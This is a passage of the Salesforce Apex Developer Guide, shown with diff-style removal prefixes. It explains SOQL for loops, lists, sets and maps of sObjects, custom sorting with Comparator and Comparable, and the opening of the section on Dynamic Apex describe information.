-   for (Account[] tmp : [SELECT Id FROM Account WHERE Name = 'yyy']) {
-
-      j = tmp.size();
-
-      i++;
-
-   }
-
-   System.assert(j == 3); // The lt should have contained the three accounts
-
-                 // named 'yyy'
-
-   System.assert(i == 1); // Since a single batch can hold up to 200 records and,
-
-                 // only three records should have been returned, the
-
-                 // loop should have executed only once
-
-   // Revert the database to the original state
-
-   Database.rollback(sp);
-
-```
-
-Note:
-
-**•** The `break` and `continue` keywords can be used in both types of inline query `for` loop formats. When using the sObject
-list format, `continue` skips to the next list of sObjects.
-
-**•** DML statements can only process up to 10,000 records at a time, and sObject list `for` loops process records in batches of
-200. Consequently, if you’re inserting, updating, or deleting more than one record per returned record in an sObject list `for`
-loop, it’s possible to encounter runtime limit’s errors. See Execution Governors and Limits.
-
-**•** You may get a `QueryException` in a SOQL `for` loop with the message `Aggregate query has too many`
-`rows for direct assignment, use FOR loop` . This exception is sometimes thrown when accessing a large
-set of child records (200 or more) of a retrieved sObject inside the loop, or when getting the size of such a record set. For
-example, the query in the following SOQL `for` loop retrieves child contacts for a particular account. If this account contains
-more than 200 child contacts, the statements in the `for` loop cause an exception.
-
-```
-       for (Account acct : [SELECT Id, Name, (SELECT Id, Name FROM Contacts)
-
-                   FROM Account WHERE Id IN ('<ID value>')]) {
-
-          List<Contact> contactList = acct.Contacts; // Causes an error
-
-          Integer count = acct.Contacts.size(); // Causes an error
-
-         // Note: If JSON.serialize() is used here on acct, the resulting JSON won't have
-
-        the complete set of Contacts
-
-       }
-
-```
-
-To avoid getting this exception, use a `for` loop to iterate over the child records, as follows.
-
-```
-       for (Account acct : [SELECT Id, Name, (SELECT Id, Name FROM Contacts)
-
-                   FROM Account WHERE Id IN ('<ID value>')]) {
-
-          Integer count=0;
-
-          for (Contact c : acct.Contacts) {
-
-```
-
-
-Apex Developer Guide Working with Data in Apex
-
-```
-            count++;
-
-          }
-
-       }
-
-```
-
-In this example, if `JSON.serialize()` is used on _`acct`_, only the records that have been retrieved so far will be returned
-and serialized. Because the Apex SOQL for-loop mechanism is designed to minimize the amount of heap usage by keeping
-only a subset of the record data in memory, the complete sObject and any subquery sObjects will not be available to obtain
-complete serialization.
-
-#### sObject Collections
-
-You can manage sObjects in lists, sets, and maps.
-
-##### Lists of sObjects
-
-Lists can contain sObjects among other types of elements. Lists of sObjects can be used for bulk processing of data.
-
-Sorting Lists of sObjects
-Using the `List.sort` method, you can sort lists of sObjects.
-
-Expanding sObject and List Expressions
-
-Sets of Objects
-Sets can contain sObjects among other types of elements.
-
-Maps of sObjects
-Map keys and values can be of any data type, including sObject types, such as Account.
-
-##### Lists of sObjects
-
-Lists can contain sObjects among other types of elements. Lists of sObjects can be used for bulk processing of data.
-
-You can use a list to store sObjects. Lists are useful when working with SOQL queries. SOQL queries return sObject data and this data
-can be stored in a list of sObjects. Also, you can use lists to perform bulk operations, such as inserting a list of sObjects with one call.
-
-##### To declare a list of sObjects, use the List keyword followed by the sObject type within <> characters. For example:
-
-```
-   // Create an empty list of Accounts
-
-   List<Account> myList = new List<Account>();
-
-```
-
-Auto-populating a List from a SOQL Query
-
-You can assign a List variable directly to the results of a SOQL query. The SOQL query returns a new list populated with the records
-returned. Make sure that the declared List variable contains the same sObject that is being queried. Or you can use the generic sObject
-data type.
-
-This example shows how to declare and assign a list of accounts to the return value of a SOQL query. The query returns up to 1,000
-returns account records containing the Id and Name fields.
-
-```
-   // Create a list of account records from a SOQL query
-
-   List<Account> accts = [SELECT Id, Name FROM Account LIMIT 1000];
-
-```
-
-
-Apex Developer Guide Working with Data in Apex
-
-Adding and Retrieving List Elements
-
-As with lists of primitive data types, you can access and set elements of sObject lists using the `List` methods provided by Apex. For
-example:
-
-```
-   List<Account> myList = new List<Account>(); // Define a new list
-
-   Account a = new Account(Name='Acme'); // Create the account first
-
-   myList.add(a); // Add the account sObject
-
-   Account a2 = myList.get(0); // Retrieve the element at index 0
-
-```
-
-Bulk Processing
-
-You can bulk-process a list of sObjects by passing a list to the DML operation. This example shows how you can insert a list of accounts.
-
-```
-   // Define the list
-
-   List<Account> acctList = new List<Account>();
-
-   // Create account sObjects
-
-   Account a1 = new Account(Name='Account1');
-
-   Account a2 = new Account(Name='Account2');
-
-   // Add accounts to the list
-
-   acctList.add(a1);
-
-   acctList.add(a2);
-
-   // Bulk insert the list
-
-   insert acctList;
-
-```
-
-Note: If you perform a bulk insert of Knowledge article versions, make the ownerId of all records the same.
-
-Record ID Generation
-
-Apex automatically generates IDs for each object in an sObject list that was inserted or upserted using DML. Therefore, a list that contains
-more than one instance of an sObject cannot be inserted or upserted even if it has a `null` ID. This situation would imply that two IDs
-would need to be written to the same structure in memory, which is illegal.
-
-For example, the `insert` statement in the following block of code generates a `ListException` because it tries to insert a list
-with two references to the same sObject ( `a` ):
-
-```
-   try {
-
-     // Create a list with two references to the same sObject element
-
-     Account a = new Account();
-
-     List<Account> accs = new List<Account>{a, a};
-
-     // Attempt to insert it...
-
-     insert accs;
-
-     // Will not get here
-
-     System.assert(false);
-
-   } catch (ListException e) {
-
-     // But will get here
-
-   }
-
-```
-
-Using Array Notation for One-Dimensional Lists of sObjects
-
-Alternatively, you can use the array notation (square brackets) to declare and reference lists of sObjects.
-
-
-Apex Developer Guide Working with Data in Apex
-
-This example declares a list of accounts using the array notation.
-
-```
-   Account[] accts = new Account[1];
-
-```
-
-This example adds an element to the list using square brackets.
-
-```
-   accts[0] = new Account(Name='Acme2');
-
-```
-
-These examples also use the array notation with sObject lists.
-
-**Example** **Description**
-
-Defines an Account list with no elements.
-```
-    List<Account> accts = new Account[]{};
-
-```
-
-```
-List<Account> accts = new Account[]
-
-     {new Account(), null, new
-
-Account()};
-
-```
-
-Defines an Account list with memory allocated for three Accounts:
-a new Account object in the first position, `null` in the second,
-and another new Account object in the third.
-
-Defines the Contact list with a new list.
-```
- List<Contact> contacts = new List<Contact>
-
- (otherList);
-
-##### Sorting Lists of sObjects
-
-```
-
-Using the `List.sort` method, you can sort lists of sObjects.
-
-For sObjects, sorting is in ascending order and uses a sequence of comparison steps outlined in the next section. You can create a custom
-sort order for sObjects by wrapping your sObject in an Apex class that implements the `Comparable` interface. You can also create a
-custom sort order by passing a class that implements `Comparator` as a parameter to the sort method. See Custom Sort Order of
-sObjects.
-
-Default Sort Order of sObjects
-
-The `List.sort` method sorts sObjects in ascending order and compares sObjects using an ordered sequence of steps that specify
-the labels or fields used. The comparison starts with the first step in the sequence and ends when two sObjects are sorted using specified
-labels or fields. The following is the comparison sequence used:
-
-**1.** The label of the sObject type.
-
-For example, an Account sObject appears before a Contact.
-
-**2.** The Name field, if applicable.
-
-For example, if the list contains two accounts named Alpha and Beta, account Alpha comes before account Beta.
-
-**3.** Standard fields, starting with the fields that come first in alphabetical order, except for the Id and Name fields.
-
-For example, if two accounts have the same name, the first standard field used for sorting is AccountNumber.
-
-**4.** Custom fields, starting with the fields that come first in alphabetical order.
-
-For example, suppose two accounts have the same name and identical standard fields, and there are two custom fields, FieldA and
-FieldB, the value of FieldA is used first for sorting.
-
-
-Apex Developer Guide Working with Data in Apex
-
-Not all steps in this sequence are necessarily carried out. For example, a list containing two sObjects of the same type and with unique
-Name values is sorted based on the Name field and sorting stops at step 2. Otherwise, if the names are identical or the sObject doesn’t
-have a Name field, sorting proceeds to step 3 to sort by standard fields.
-
-For text fields, the sort algorithm uses the Unicode sort order. Also, empty fields precede non-empty fields in the sort order.
-
-Here’s an example of sorting a list of Account sObjects. This example shows how the Name field is used to place the Acme account
-ahead of the two sForce accounts in the list. Since there are two accounts named sForce, the Industry field is used to sort these remaining
-accounts because the Industry field comes before the Site field in alphabetical order.
-
-```
-   Account[] acctList = new List<Account>();
-
-   acctList.add( new Account(
-
-      Name='sForce',
-
-      Industry='Biotechnology',
-
-      Site='Austin'));
-
-   acctList.add(new Account(
-
-      Name='sForce',
-
-      Industry='Agriculture',
-
-      Site='New York'));
-
-   acctList.add(new Account(
-
-      Name='Acme'));
-
-   System.debug(acctList);
-
-   acctList.sort();
-
-   Assert.areEqual('Acme', acctList[0].Name);
-
-   Assert.areEqual('sForce', acctList[1].Name);
-
-   Assert.areEqual('Agriculture', acctList[1].Industry);
-
-   Assert.areEqual('sForce', acctList[2].Name);
-
-   Assert.areEqual('Biotechnology', acctList[2].Industry);
-
-   System.debug(acctList);
-
-```
-
-This example is similar to the previous one, except that it uses the Merchandise__c custom object. This example shows how the Name
-field is used to place the Notebooks merchandise ahead of Pens in the list. Because there are two merchandise sObjects with the Name
-field value of Pens, the Description field is used to sort these remaining merchandise items. The Description field is used for sorting
-because it comes before the Price and Total_Inventory fields in alphabetical order.
-
-```
-   Merchandise__c[] merchList = new List<Merchandise__c>();
-
-   merchList.add( new Merchandise__c(
-
-      Name='Pens',
-
-      Description__c='Red pens',
-
-      Price__c=2,
-
-      Total_Inventory__c=1000));
-
-   merchList.add( new Merchandise__c(
-
-      Name='Notebooks',
-
-      Description__c='Cool notebooks',
-
-      Price__c=3.50,
-
-      Total_Inventory__c=2000));
-
-   merchList.add( new Merchandise__c(
-
-      Name='Pens',
-
-      Description__c='Blue pens',
-
-      Price__c=1.75,
-
-      Total_Inventory__c=800));
-
-   System.debug(merchList);
-
-   merchList.sort();
-
-   Assert.areEqual('Notebooks', merchList[0].Name);
-
-```
-
-
-Apex Developer Guide Working with Data in Apex
-
-```
-   Assert.areEqual('Pens', merchList[1].Name);
-
-   Assert.areEqual('Blue pens', merchList[1].Description__c);
-
-   Assert.areEqual('Pens', merchList[2].Name);
-
-   Assert.areEqual('Red pens', merchList[2].Description__c);
-
-   System.debug(merchList);
-
-```
-
-Custom Sort Order of sObjects
-
-To create a custom sort order for sObjects in lists, implement the `Comparator` interface and pass it as a parameter to the `List.sort`
-method.
-
-Alternatively, create a wrapper class for the sObject and implement the `Comparable` interface. The wrapper class contains the sObject
-in question and implements the `Comparable.compareTo` method in which you specify the sort logic.
-
-Example: This example implements the `Comparator` interface to compare two opportunities based on the Amount field.
-
-```
-      public class OpportunityComparator implements Comparator<Opportunity> {
-
-        public Integer compare(Opportunity o1, Opportunity o2) {
-
-           // The return value of 0 indicates that both elements are equal.
-
-           Integer returnValue = 0;
-
-           if(o1 == null && o2 == null) {
-
-             returnValue = 0;
-
-           } else if(o1 == null) {
-
-             // nulls-first implementation
-
-             returnValue = -1;
-
-           } else if(o2 == null) {
-
-             // nulls-first implementation
-
-             returnValue = 1;
-
-           } else if ((o1.Amount == null) && (o2.Amount == null)) {
-
-             // both have null Amounts
-
-             returnValue = 0;
-
-           } else if (o1.Amount == null){
-
-             // nulls-first implementation
-
-             returnValue = -1;
-
-           } else if (o2.Amount == null){
-
-             // nulls-first implementation
-
-             returnValue = 1;
-
-           } else if (o1.Amount < o2.Amount) {
-
-             // Set return value to a negative value.
-
-             returnValue = -1;
-
-           } else if (o1.Amount > o2.Amount) {
-
-             // Set return value to a positive value.
-
-             returnValue = 1;
-
-           }
-
-           return returnValue;
-
-        }
-
-      }
-
-```
-
-This test sorts a list of `Comparator` objects and verifies that the list elements are sorted by the opportunity amount.
-
-```
-      @isTest
-
-      private class OpportunityComparator_Test {
-
-        @isTest
-
-```
-
-
-Apex Developer Guide Working with Data in Apex
-
-```
-        static void sortViaComparator() {
-
-           // Add the opportunity wrapper objects to a list.
-
-           List<Opportunity> oppyList = new List<Opportunity>();
-
-           Date closeDate = Date.today().addDays(10);
-
-           oppyList.add( new Opportunity(
-
-             Name='Edge Installation',
-
-             CloseDate=closeDate,
-
-             StageName='Prospecting',
-
-             Amount=50000));
-
-           oppyList.add( new Opportunity(
-
-             Name='United Oil Installations',
-
-             CloseDate=closeDate,
-
-             StageName='Needs Analysis',
-
-             Amount=100000));
-
-           oppyList.add( new Opportunity(
-
-             Name='Grand Hotels SLA',
-
-             CloseDate=closeDate,
-
-             StageName='Prospecting',
-
-             Amount=25000));
-
-           oppyList.add(null);
-
-           // Sort the objects using the Comparator implementation
-
-           oppyList.sort(new OpportunityComparator());
-
-           // Verify the sort order
-
-           Assert.isNull(oppyList[0]);
-
-           Assert.areEqual('Grand Hotels SLA', oppyList[1].Name);
-
-           Assert.areEqual(25000, oppyList[1].Amount);
-
-           Assert.areEqual('Edge Installation', oppyList[2].Name);
-
-           Assert.areEqual(50000, oppyList[2].Amount);
-
-           Assert.areEqual('United Oil Installations', oppyList[3].Name);
-
-           Assert.areEqual(100000, oppyList[3].Amount);
-
-           // Write the sorted list contents to the debug log.
-
-           System.debug(oppyList);
-
-        }
-
-      }
-
-```
-
-Example: This example shows how to create a wrapper `Comparable` class for Opportunity. The implementation of the
-`compareTo` method in this class compares two opportunities based on the Amount field—the class member variable contained
-in this instance, and the opportunity object passed into the method.
-
-```
-      public class OpportunityWrapper implements Comparable {
-
-        public Opportunity oppy;
-
-        // Constructor
-
-        public OpportunityWrapper(Opportunity op) {
-
-         // Guard against wrapping a null
-
-         if(op == null) {
-
-         Exception ex = new NullPointerException();
-
-         ex.setMessage('Opportunity argument cannot be null');
-
-         throw ex;
-
-         }
-
-           oppy = op;
-
-        }
-
-```
-
-
-Apex Developer Guide Working with Data in Apex
-
-```
-        // Compare opportunities based on the opportunity amount.
-
-        public Integer compareTo(Object compareTo) {
-
-           // Cast argument to OpportunityWrapper
-
-           OpportunityWrapper compareToOppy = (OpportunityWrapper)compareTo;
-
-           // The return value of 0 indicates that both elements are equal.
-
-           Integer returnValue = 0;
-
-           if ((oppy.Amount == null) && (compareToOppy.oppy.Amount == null)) {
-
-             // both wrappers have null Amounts
-
-             returnValue = 0;
-
-           } else if ((oppy.Amount == null) && (compareToOppy.oppy.Amount != null)){
-
-             // nulls-first implementation
-
-             returnValue = -1;
-
-           } else if ((oppy.Amount != null) && (compareToOppy.oppy.Amount == null)){
-
-             // nulls-first implementation
-
-             returnValue = 1;
-
-           } else if (oppy.Amount > compareToOppy.oppy.Amount) {
-
-             // Set return value to a positive value.
-
-             returnValue = 1;
-
-           } else if (oppy.Amount < compareToOppy.oppy.Amount) {
-
-             // Set return value to a negative value.
-
-             returnValue = -1;
-
-           }
-
-           return returnValue;
-
-        }
-
-      }
-
-```
-
-This test sorts a list of `OpportunityWrapper` objects and verifies that the list elements are sorted by the opportunity amount.
-
-```
-      @isTest
-
-      private class OpportunityWrapperTest {
-
-        static testmethod void test1() {
-
-           // Add the opportunity wrapper objects to a list.
-
-           OpportunityWrapper[] oppyList = new List<OpportunityWrapper>();
-
-           Date closeDate = Date.today().addDays(10);
-
-           oppyList.add( new OpportunityWrapper(new Opportunity(
-
-             Name='Edge Installation',
-
-             CloseDate=closeDate,
-
-             StageName='Prospecting',
-
-             Amount=50000)));
-
-           oppyList.add( new OpportunityWrapper(new Opportunity(
-
-             Name='United Oil Installations',
-
-             CloseDate=closeDate,
-
-             StageName='Needs Analysis',
-
-             Amount=100000)));
-
-           oppyList.add( new OpportunityWrapper(new Opportunity(
-
-             Name='Grand Hotels SLA',
-
-             CloseDate=closeDate,
-
-             StageName='Prospecting',
-
-             Amount=25000)));
-
-           // Sort the wrapper objects using the implementation of the
-
-           // compareTo method.
-
-           oppyList.sort();
-
-```
-
-
-Apex Developer Guide Working with Data in Apex
-
-```
-           // Verify the sort order
-
-           Assert.areEqual('Grand Hotels SLA', oppyList[0].oppy.Name);
-
-           Assert.areEqual(25000, oppyList[0].oppy.Amount);
-
-           Assert.areEqual('Edge Installation', oppyList[1].oppy.Name);
-
-           Assert.areEqual(50000, oppyList[1].oppy.Amount);
-
-           Assert.areEqual('United Oil Installations', oppyList[2].oppy.Name);
-
-           Assert.areEqual(100000, oppyList[2].oppy.Amount);
-
-           // Write the sorted list contents to the debug log.
-
-           System.debug(oppyList);
-
-        }
-
-      }
-
-```
-
-SEE ALSO:
-
-_[Apex Reference Guide](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_class_System_Collator.htm)_ : Collator Class
-
-_Apex Reference Guide_ [: Comparable Interface](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_comparable.htm)
-
-_Apex Reference Guide_ [: Comparator Interface](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_interface_System_Comparator.htm)
-
-##### Expanding sObject and List Expressions
-
-As in Java, sObject and list expressions can be expanded with method references and list expressions, respectively, to form new expressions.
-
-In the following example, a new variable containing the length of the new account name is assigned to `acctNameLength` .
-
-```
-   Integer acctNameLength = new Account[]{new Account(Name='Acme')}[0].Name.length();
-
-```
-
-In the above, `new Account[]` generates a list.
-
-The list is populated with one element by the `new` statement `{new Account(name='Acme')}` .
-
-Item 0, the first item in the list, is then accessed by the next part of the string `[0]` .
-
-The name of the sObject in the list is accessed, followed by the method returning the length `name.length()` .
-
-In the following example, a name that has been shifted to lower case is returned. The SOQL statement returns a list of which the first
-element (at index 0) is accessed through `[0]` . Next, the Name field is accessed and converted to lowercase with this expression
-`.Name.toLowerCase()` .
-
-```
-   String nameChange = [SELECT Name FROM Account][0].Name.toLowerCase();
-
-##### Sets of Objects
-
-```
-
-Sets can contain sObjects among other types of elements.
-
-Sets contain unique elements. Uniqueness of sObjects is determined by comparing the objects’ fields. For example, if you try to add two
-accounts with the same name to a set, with no other fields set, only one sObject is added to the set.
-
-```
-   // Create two accounts, a1 and a2
-
-   Account a1 = new account(name='MyAccount');
-
-   Account a2 = new account(name='MyAccount');
-
-   // Add both accounts to the new set
-
-   Set<Account> accountSet = new Set<Account>{a1, a2};
-
-```
-
-
-Apex Developer Guide Working with Data in Apex
-
-```
-   // Verify that the set only contains one item
-
-   System.assertEquals(accountSet.size(), 1);
-
-```
-
-If you add a description to one of the accounts, it is considered unique and both accounts are added to the set.
-
-```
-   // Create two accounts, a1 and a2, and add a description to a2
-
-   Account a1 = new account(name='MyAccount');
-
-   Account a2 = new account(name='MyAccount', description='My test account');
-
-   // Add both accounts to the new set
-
-   Set<Account> accountSet = new Set<Account>{a1, a2};
-
-   // Verify that the set contains two items
-
-   System.assertEquals(accountSet.size(), 2);
-
-```
-
-Warning: If set elements are objects, and these objects change after being added to the collection, they won’t be found anymore
-when using, for example, the `contains` or `containsAll` methods, because of changed field values.
-
-##### Maps of sObjects
-
-Map keys and values can be of any data type, including sObject types, such as Account.
-
-Maps can hold sObjects both in their keys and values. A map key represents a unique value that maps to a map value. For example, a
-common key would be an ID that maps to an account (a specific sObject type). This example shows how to define a map whose keys
-are of type ID and whose values are of type Account.
-
-```
-   Map<ID, Account> m = new Map<ID, Account>();
-
-```
-
-As with primitive types, you can populate map key-value pairs when the map is declared by using curly brace ( `{}` ) syntax. Within the
-curly braces, specify the key first, then specify the value for that key using `=>` . This example creates a map of integers to accounts lists
-and adds one entry using the account list created earlier.
-
-```
-   Account[] accs = new Account[5]; // Account[] is synonymous with List<Account>
-
-   Map<Integer, List<Account>> m4 = new Map<Integer, List<Account>>{1 => accs};
-
-```
-
-Maps allow sObjects in their keys. You must use sObjects in the keys only when the sObject field values won’t change.
-
-Auto-Populating Map Entries from a SOQL Query
-
-When working with SOQL queries, maps can be populated from the results returned by the SOQL query. The map key must be declared
-with an ID or String data type, and the map value must be declared as an sObject data type.
-
-This example shows how to populate a new map from a query. In the example, the SOQL query returns a list of accounts with their `Id`
-and `Name` fields. The `new` operator uses the returned list of accounts to create a map.
-
-```
-   // Populate map from SOQL query
-
-   Map<ID, Account> m = new Map<ID, Account>([SELECT Id, Name FROM Account LIMIT 10]);
-
-   // After populating the map, iterate through the map entries
-
-   for (ID idKey : m.keyset()) {
-
-      Account a = m.get(idKey);
-
-      System.debug(a);
-
-   }
-
-```
-
-One common usage of this map type is for in-memory “joins” between two tables.
-
-
-Apex Developer Guide Working with Data in Apex
-
-Note: RecentlyViewed records for users who are members of several communities can’t be retrieved automatically into a map
-via Apex. This is because records of a user with different networks can result in duplicate IDs that maps don’t support. For more
-[information, see RecentlyViewed.](https://developer.salesforce.com/docs/atlas.en-us.260.0.object_reference.meta/object_reference/sforce_api_objects_recentlyviewed.htm)
-
-Using Map Methods
-
-The `Map` class exposes various methods that you can use to work with map elements, such as adding, removing, or retrieving elements.
-This example uses Map methods to add new elements and retrieve existing elements from the map. This example also checks for the
-existence of a key and gets the set of all keys. The map in this example has one element with an integer key and an account value.
-
-```
-   Account myAcct = new Account(); //Define a new account
-
-   Map<Integer, Account> m = new Map<Integer, Account>(); // Define a new map
-
-   m.put(1, myAcct); // Insert a new key-value pair in the map
-
-   System.assert(!m.containsKey(3)); // Assert that the map contains a key
-
-   Account a = m.get(1); // Retrieve a value, given a particular key
-
-   Set<Integer> s = m.keySet(); // Return a set that contains all of the keys in the
-
-   map
-
-###### sObject Map Considerations sObject Map Considerations
-
-```
-
-Be cautious when using sObjects as map keys. Key matching for sObjects is based on the comparison of all sObject field values. If one
-or more field values change after adding an sObject to the map, attempting to retrieve this sObject from the map returns `null` . This
-is because the modified sObject isn’t found in the map due to different field values. This can occur if you explicitly change a field on the
-sObject, or if the sObject fields are implicitly changed by the system; for example, after inserting an sObject, the sObject variable has the
-ID field autofilled. Attempting to fetch this Object from a map to which it was added before the `insert` operation won’t yield the
-map entry, as shown in this example.
-
-```
-   // Create an account and add it to the map
-
-   Account a1 = new Account(Name='A1');
-
-   Map<sObject, Integer> m = new Map<sObject, Integer>{
-
-   a1 => 1};
-
-   // Get a1's value from the map.
-
-   // Returns the value of 1.
-
-   System.assertEquals(1, m.get(a1));
-
-   // Id field is null.
-
-   System.assertEquals(null, a1.Id);
-
-   // Insert a1.
-
-   // This causes the ID field on a1 to be auto-filled
-
-   insert a1;
-
-   // Id field is now populated.
-
-   System.assertNotEquals(null, a1.Id);
-
-   // Get a1's value from the map again.
-
-   // Returns null because Map.get(sObject) doesn't find
-
-   // the entry based on the sObject with an auto-filled ID.
-
-   // This is because when a1 was originally added to the map
-
-   // before the insert operation, the ID of a1 was null.
-
-   System.assertEquals(null, m.get(a1));
-
-```
-
-
-Apex Developer Guide Working with Data in Apex
-
-Another scenario where sObject fields are autofilled is in triggers, for example, when using before and after insert triggers for an sObject.
-If those triggers share a static map defined in a class, and the sObjects in `Trigger.New` are added to this map in the before trigger,
-the sObjects in `Trigger.New` in the after trigger aren’t found in the map because the two sets of sObjects differ by the fields that
-are autofilled. The sObjects in `Trigger.New` in the after trigger have system fields populated after insertion, namely: ID, CreatedDate,
-CreatedById, LastModifiedDate, LastModifiedById, and SystemModStamp.
-
-#### Dynamic Apex Dynamic Apex enables developers to create more flexible applications by providing them with the ability to:
-
-**•** Access sObject and field describe information
-
-_Describe information_ provides metadata information about sObject and field properties. For example, the describe information for
-an sObject includes whether that type of sObject supports operations like create or undelete, the sObject's name and label, the
-sObject's fields and child objects, and so on. The describe information for a field includes whether the field has a default value,
-whether it is a calculated field, the type of the field, and so on.
-
-Note that describe information provides information about _objects_ in an organization, not individual records.
-
-**•** Access Salesforce app information
-
-You can obtain describe information for standard and custom apps available in the Salesforce user interface. Each app corresponds
-to a collection of tabs. Describe information for an app includes the app’s label, namespace, and tabs. Describe information for a tab
-includes the sObject associated with the tab, tab icons and colors.
-
-**•** Write dynamic SOQL queries, dynamic SOSL queries and dynamic DML
-
-_Dynamic SOQL and SOSL queries_ provide the ability to execute SOQL or SOSL as a string at runtime, while _dynamic DML_ provides the
-ability to create a record dynamically and then insert it into the database using DML. Using dynamic SOQL, SOSL, and DML, an
-application can be tailored precisely to the organization as well as the user's permissions. This can be useful for applications that are
-installed from AppExchange.
-
-##### 1. Understanding Apex Describe Information
-
-2. Using Field Tokens
-
-3. Understanding Describe Information Permissions
-
-4. Describing sObjects Using Schema Method
-
-5. Describing Tabs Using Schema Methods
-
-6. Accessing All sObjects
-
-7. Accessing All Data Categories Associated with an sObject
-
-8. Dynamic SOQL
-
-9. Dynamic SOSL
-
-10. Dynamic DML
-
-##### Understanding Apex Describe Information
-
-You can describe sObjects either by using tokens or the `describeSObjects` Schema method.
-
-Apex provides two data structures and a method for sObject and field describe information:
-
-**•** _Token_ —a lightweight, serializable reference to an sObject or a field that is validated at compile time. This is used for token describes.
-
-
-Apex Developer Guide Working with Data in Apex
-
-**•** The `describeSObjects` method—a method in the `Schema` class that performs describes on one or more sObject types.
-
-**•** _Describe result_ —an object of type `Schema.DescribeSObjectResult` that contains all the describe properties for the
-sObject or field. Describe result objects are not serializable, and are validated at runtime. This result object is returned when performing
-the describe, using either the sObject token or the `describeSObjects` method.
-
-Describing sObjects Using Tokens
-
-It is easy to move from a token to its describe result, and vice versa. Both sObject and field tokens have the method `getDescribe`
-which returns the describe result for that token. On the describe result, the `getSObjectType` and `getSObjectField` methods
-return the tokens for sObject and field, respectively.
-
-Because tokens are lightweight, using them can make your code faster and more efficient. For example, use the token version of an
-sObject or field when you are determining the type of an sObject or field that your code needs to use. The token can be compared using
-the equality operator ( `==` ) to determine whether an sObject is the Account object, for example, or whether a field is the `Name` field or
-a custom calculated field.
-
-The following code provides a general example of how to use tokens and describe results to access information about sObject and field
-properties:
-
-```
-   // Create a new account as the generic type sObject
-
-   sObject s = new Account();
-
-   // Verify that the generic sObject is an Account sObject
-
-   System.assert(s.getsObjectType() == Account.sObjectType);
-
-   // Get the sObject describe result for the Account object
-
-   Schema.DescribeSObjectResult dsr = Account.sObjectType.getDescribe();
-
-   // Get the field describe result for the Name field on the Account object
-
-   Schema.DescribeFieldResult dfr = Schema.sObjectType.Account.fields.Name;
-
-   // Verify that the field token is the token for the Name field on an Account object
-
-   System.assert(dfr.getSObjectField() == Account.Name);
-
-   // Get the field describe result from the token
-
-   dfr = dfr.getSObjectField().getDescribe();
-
-```
-
-The following algorithm shows how you can work with describe information in Apex:
-
-**1.** Generate a list or map of tokens for the sObjects in your organization (see Accessing All sObjects.)
-
-**2.** Determine the sObject you need to access.
-
-**3.** Generate the describe result for the sObject.
-
-**4.** If necessary, generate a map of field tokens for the sObject (see Accessing All Field Describe Results for an sObject.)
-
-**5.** Generate the describe result for the field the code needs to access.
-
-Using sObject Tokens
-
-SObjects, such as Account and MyCustomObject__c, act as static classes with special static methods and member variables for accessing
-token and describe result information. You must explicitly reference an sObject and field name at compile time to gain access to the
-describe result.
-
-To access the token for an sObject, use one of the following methods:
-
-**•** Access the `sObjectType` member variable on an sObject type, such as Account.
-
-
-Apex Developer Guide Working with Data in Apex
-
-**•** Call the `getSObjectType` method on an sObject describe result, an sObject variable, a list, or a map.
-
-`Schema.SObjectType` is the data type for an sObject token.
-
-In the following example, the token for the Account sObject is returned:
-
-```
-   Schema.sObjectType t = Account.sObjectType;
-
-```
-
-The following also returns a token for the Account sObject:
-
-```
-   Account a = new Account();
-
-   Schema.sObjectType t = a.getSObjectType();
-
-```
-
-This example can be used to determine whether an sObject or a list of sObjects is of a particular type:
-
-```
-   // Create a generic sObject variable s
-
-   SObject s = Database.query('SELECT Id FROM Account LIMIT 1');
-
-   // Verify if that sObject variable is an Account token
-
-   System.assertEquals(s.getSObjectType(), Account.sObjectType);
-
-   // Create a list of generic sObjects
-
-   List<sObject> sobjList = new Account[]{};
-
-   // Verify if the list of sObjects contains Account tokens
-
-   System.assertEquals(sobjList.getSObjectType(), Account.sObjectType);
-
-```
-
-Some standard sObjects have a field called `sObjectType`, for example, AssignmentRule, QueueSObject, and RecordType. For these
-types of sObjects, always use the `getSObjectType` method for retrieving the token. If you use the property, for example,
-`RecordType.sObjectType`, the field is returned.
-
-Obtaining sObject Describe Results Using Tokens
-
-To access the describe result for an sObject, use one of the following methods:
-
-**•** Call the `getDescribe` method on an sObject token.
-
-**•** Use the Schema `sObjectType` static variable with the name of the sObject. For example, `Schema.sObjectType.Lead` .
-
-`Schema.DescribeSObjectResult` is the data type for an sObject describe result.
-
-The following example uses the `getDescribe` method on an sObject token:
-
-```
-   Schema.DescribeSObjectResult dsr = Account.sObjectType.getDescribe();
-
-```
-
-The following example uses the Schema `sObjectType` static member variable:
-
-```
-   Schema.DescribeSObjectResult dsr = Schema.SObjectType.Account;
-
-```
-
-[For more information about the methods available with the sObject describe result, see DescribeSObjectResultClass.](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_sobject_describe.htm)
-
-SEE ALSO:
-
-[DescribeSObjectResult.fields()](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_sobject_describe.htm)
-
-[DescribeSObjectResult.fieldsets()](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_sobject_describe.htm)
-
-##### Using Field Tokens
-
-To access the token for a field, use one of the following methods:
-
-
-Apex Developer Guide Working with Data in Apex
-
-**•** Access the static member variable name of an sObject static type, for example, `Account.Name` .
-
-**•** Call the `getSObjectField` method on a field describe result.
-
-The field token uses the data type `Schema.SObjectField` .
-
-In the following example, the field token is returned for the Account object's `Description` field:
-
-```
-   Schema.SObjectField fieldToken = Account.Description;
-
-```
-
-In the following example, the field token is returned from the field describe result:
-
-```
-   // Get the describe result for the Name field on the Account object
-
-   Schema.DescribeFieldResult dfr = Schema.sObjectType.Account.fields.Name;
-
-   // Verify that the field token is the token for the Name field on an Account object
-
-   System.assert(dfr.getSObjectField() == Account.Name);
-
-   // Get the describe result from the token
-
-   dfr = dfr.getSObjectField().getDescribe();
-
-```
-
-Note: Field tokens aren't available for person accounts. If you access `Schema.Account.` _**`fieldname`**_, you get an exception
-error. Instead, specify the field name as a string.
-
-Using Field Describe Results
-
-To access the describe result for a field, use one of the following methods:
-
-**•** Call the `getDescribe` method on a field token.
-
-**•** Access the `fields` member variable of an sObject token with a field member variable (such as `Name`, `BillingCity`, and so
-on.)
-
-The field describe result uses the data type `Schema.DescribeFieldResult` .
-
-The following example uses the `getDescribe` method:
-
-```
